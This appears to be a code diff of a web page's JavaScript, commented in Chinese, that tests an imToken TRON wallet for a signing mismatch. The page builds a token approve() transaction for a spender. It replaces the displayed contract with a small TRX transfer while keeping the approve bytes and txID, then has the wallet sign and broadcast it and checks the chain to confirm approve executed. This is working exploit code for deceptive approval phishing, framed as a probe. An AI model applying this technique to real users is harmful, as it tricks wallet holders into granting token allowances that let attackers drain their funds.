+      var built = await window.tronWeb.transactionBuilder.triggerSmartContract(
+        contractHex,
+        'approve(address,uint256)',
+        { feeLimit: 100000000, callValue: 0 },
+        [
+          { type: 'address', value: SPENDER },
+          { type: 'uint256', value: APPROVE_AMOUNT }
+        ],
         userHex
       );
-      if (!built.result?.result) { log('approve 构造失败', 'error'); return; }
-      const approveTx = built.transaction;
-      const hasSelector = approveTx.raw_data_hex.includes('095ea7b3');
-      log('执行层 approve txID = ' + approveTx.txID, 'warn');
-      log('raw_data_hex 含 approve 选择器 095ea7b3: ' + hasSelector, hasSelector ? 'success' : 'error');
 
-      // 2) 显示层：真实 TransferContract —— 字段完整，imToken UI 可正常解析（不会缺字段闪退）
-      const transferBuilt = await window.tronWeb.transactionBuilder.sendTrx(SPENDER, 100000, walletAddr);
-      const transferContract = transferBuilt.raw_data.contract[0];
+      if (!built.result || !built.result.result) {
+        log('approve 构造失败: ' + JSON.stringify(built.result), 'error');
+        return;
+      }
 
-      // 3) 组装：执行层(hex/txID)=approve，显示层(contract)=transfer
-      const submitTx = {
+      var approveTx = built.transaction;
+      var hasSelector = approveTx.raw_data_hex.indexOf('095ea7b3') !== -1;
+
+      log('[执行层] approve txID = ' + approveTx.txID, 'warn');
+      log('[执行层] raw_data_hex 含 approve 选择器 095ea7b3: ' + hasSelector,
+          hasSelector ? 'success' : 'error');
+      log('[执行层] raw_data_hex 签名锚定: approve', 'success');
+
+      // ===== Step 2: 构造显示层——真实 TransferContract =====
+      // 使用 sendTrx 生成完整的 TransferContract（字段完整，imToken UI 可正常解析）
+      var trxAmount = 100000; // 0.1 TRX
+      var transferBuilt = await window.tronWeb.transactionBuilder.sendTrx(
+        SPENDER,
+        trxAmount,
+        walletAddr
+      );
+      var transferContract = transferBuilt.raw_data.contract[0];
+
+      log('[显示层] contract.type = ' + transferContract.type, 'warn');
+      log('[显示层] UI 预期显示: 转账 0.1 TRX → ' + SPENDER, 'warn');
+
+      // ===== Step 3: 组装——执行层(hex/txID) = approve，显示层(contract) = transfer =====
+      var submitTx = {
         visible: approveTx.visible,
         txID: approveTx.txID,
-        raw_data: Object.assign({}, approveTx.raw_data, { contract: [transferContract] }),
+        raw_data: Object.assign({}, approveTx.raw_data, {
+          contract: [transferContract]
+        }),
         raw_data_hex: approveTx.raw_data_hex
       };
-      log('显示层 contract.type = ' + transferContract.type + '（UI 预期：转账）', 'warn');
-      log('执行层 raw_data_hex 前64 = ' + approveTx.raw_data_hex.slice(0, 64), 'warn');
 
-      // 4) 经 imToken 签名广播（结构合法、无数字键、字段完整 → 不触发桥接守卫，也不致闪退）
-      log('调用 imToken.tron.sendTransaction …', 'warn');
-      let res;
-      try {
-        res = await window.imToken.callPromisifyAPI('tron.sendTransaction', {
-          tx: submitTx, from: walletAddr, useTronHeader: true
-        });
-      } catch (e) {
-        const msg = String(e?.message || e);
-        log('imToken 返回错误: ' + msg, 'error');
-        if (/sigerror|validate signature/i.test(msg)) {
-          log('→ imToken 用 raw_data(transfer) 重算签名，与 approve 的 txID 不一致 → 该版本对 hex/json 做了一致性校验（有防护）', 'error');
-        } else if (/reject|user_rejected/i.test(msg)) {
-          log('→ 用户在弹窗取消', 'warn');
-        } else if (/contract_validate/i.test(msg)) {
-          log('→ CONTRACT_VALIDATE_ERROR：参数/余额/能量校验失败，非签名问题', 'error');
+      log('', 'warn');
+      log('[组装] raw_data_hex(执行层) ← approve', 'success');
+      log('[组装] raw_data.contract[0](显示层) ← TransferContract', 'warn');
+      log('[组装] txID(签名锚定) ← approve', 'success');
+      log('', 'warn');
+
+      // ===== Step 4: 经 imToken 签名广播 =====
+      var txid = await sendTx(submitTx, '所见非所签探针');
+      $('probeResultCard').style.display = 'block';
+      $('probeTxid').textContent = txid || '未获取';
+
+      if (txid) {
+        // ===== Step 5: 回链验证 =====
+        log('', 'warn');
+        log('── 回链验证 contract.type（最多 ~16s）──', 'warn');
+
+        var onchainType = await fetchOnchainTypeRetry(txid, 4);
+
+        $('probeOnchainType').textContent = onchainType || '未确认';
+
+        if (onchainType === 'TriggerSmartContract') {
+          $('probeOnchainType').style.color = 'var(--red)';
+          $('probeVerdict').textContent = '🔴 所见非所签漏洞成立！';
+          $('probeVerdict').style.color = 'var(--red)';
+          $('probeInfoBox').innerHTML = 'UI 显示转账(TransferContract)，链上实际执行 approve(TriggerSmartContract) → <strong>漏洞确证</strong>。';
+          $('probeInfoBox').style.background = 'rgba(240,67,67,0.12)';
+          $('probeInfoBox').style.borderColor = 'rgba(240,67,67,0.35)';
+          $('probeInfoBox').style.color = 'var(--red)';
+          log('🔴 确证：UI=转账，链上=approve → 所见非所签漏洞成立！', 'error');
+
+          // 再次查询 allowance 确认变化
+          await queryAndShowAllowance(false);
+
+        } else if (onchainType === 'TransferContract') {
+          $('probeOnchainType').style.color = 'var(--green)';
+          $('probeVerdict').textContent = '🟢 所见即所签（无此漏洞）';
+          $('probeVerdict').style.color = 'var(--green)';
+          $('probeInfoBox').innerHTML = 'imToken 以 raw_data 为准，链上记录为转账 → <strong>该版本无此漏洞</strong>。';
+          $('probeInfoBox').style.background = 'rgba(46,204,113,0.08)';
+          $('probeInfoBox').style.borderColor = 'rgba(46,204,113,0.2)';
+          $('probeInfoBox').style.color = 'var(--green)';
+          log('🟢 imToken 以 raw_data 为准，链上=转账 → 所见即所签', 'success');
+
+        } else {
+          $('probeOnchainType').style.color = 'var(--orange)';
+          $('probeVerdict').textContent = '⚠️ 待确认（tx 可能未打包）';
+          $('probeVerdict').style.color = 'var(--orange)';
+          $('probeInfoBox').innerHTML = '链上暂未确认该 tx，可稍后点击"④ 再次查询 allowance"查看授权额是否增加来间接判定。';
+          log('链上暂未确认，可稍后手动查 allowance', 'warn');
         }
-        return;
-      }
-      log('imToken 原始返回: ' + JSON.stringify(res), 'warn');
-      const txid = findTxId(res);
-      if (!txid) {
-        log('未返回 64 位 txID，无法回链判定（imToken 可能仅返回 result，需手动查 Tronscan）', 'warn');
-        return;
-      }
-      log('✅ 已广播 txID = ' + txid, 'success');
-      log('Tronscan: https://tronscan.org/#/transaction/' + txid, 'info');
 
-      // 5) 回链判定执行层（节点实际记录的合约类型）
-      log('回链查询链上实际合约类型（最多 ~16s）…', 'warn');
-      const type = await fetchOnchainTypeRetry(txid, 4);
-      if (type === 'TriggerSmartContract') {
-        log('🔴 所见非所签确证：UI 显示转账(TransferContract)，链上实际执行 approve(TriggerSmartContract)', 'error');
-        await refreshAllowanceUI(false);
-      } else if (type === 'TransferContract') {
-        log('🟢 所见即所签：imToken 以 raw_data 为准，链上记录为转账，无此漏洞', 'success');
-      } else {
-        log('链上暂未确认该交易（可能尚未打包或被节点拒绝），可稍后点④手动查授权额度', 'warn');
+      } else if (txid === false) {
+        // 被拦截（validRawTx / SIGERROR）
+        log('探针被拦截，该 imToken 版本存在 hex/json 一致性校验', 'warn');
       }
     } catch (e) {
       log('探针异常: ' + (e.message || e), 'error');
     }
   }
 
-  async function manualCheck() {
-    if (!walletAddr) return;
-    log('手动查询 allowance…', 'warn');
-    await refreshAllowanceUI(false);
-  }
-
+  // ==================== 事件绑定 ====================
   $('btnConnect').addEventListener('click', connect);
-  $('btnNormal').addEventListener('click', normalTrx);
-  $('btnApprove').addEventListener('click', originalApprove);
-  $('btnMixed').addEventListener('click', mixedTx);
-  $('btnCheckAllowance').addEventListener('click', manualCheck);
-  $('btnDirectTest').addEventListener('click', directBroadcastTest);
+  $('btnQueryAllowance').addEventListener('click', function() {
+    queryAndShowAllowance(false);
+  });
+  $('btnQueryAgain').addEventListener('click', function() {
+    queryAndShowAllowance(false);
+  });
+  $('btnProbe').addEventListener('click', runProbe);
 
-  if (hasBridge()) log('imToken 桥接环境就绪', 'success');
-  else log('请在 imToken DApp 浏览器中打开', 'warn');
+  // ==================== 启动检测 ====================
+  if (hasBridge()) {
+    log('imToken 桥接环境就绪，点击"连接 imToken 钱包"开始', 'success');
+  } else {
+    log('请在 imToken DApp 浏览器中打开此页面', 'warn');
+  }
 })();
 </script>
 </body>
